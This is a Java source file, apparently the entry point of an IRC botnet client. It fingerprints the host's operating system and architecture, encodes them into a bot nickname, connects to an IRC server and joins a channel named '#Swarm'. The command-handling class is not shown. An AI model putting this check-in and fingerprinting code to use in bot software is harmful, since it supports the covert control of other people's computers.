import java.io.IOException;
import java.util.Random;
import org.jibble.pircbot.IrcException;
import org.jibble.pircbot.NickAlreadyInUseException;

public class CBotMain {
	static String OSName = System.getProperty("os.name");
	static String OSStruct = System.getProperty("os.arch");
	static String UserName = System.getProperty("user.name");
	static String homeDir = System.getProperty("");
	public static String OSNameS() {
		System.out.println("Operating System name: " + OSName + " Operating System Struct: " + OSStruct);
		if (OSName .equalsIgnoreCase("Windows XP")) {
			return "XP";
		}
		else if (OSName.equalsIgnoreCase("Windows Vista")) {
			return "Vista";
		}
		else if (OSName.equals("Windows 7"))
		{
			return "Win7";
		}
		return "Unknown";
	}
	public static void main(String args[]) {
	Random randomGenerator = new Random();
	int randnumber = randomGenerator.nextInt(100000);
		CBotS1 Bot1 = new CBotS1(OSNameS() + "|" + OSStruct + "|" + randnumber);
		try {
			Bot1.connect("192.168.0.104");
		} catch (NickAlreadyInUseException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (IrcException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		Bot1.joinChannel("#Swarm");
	}
}
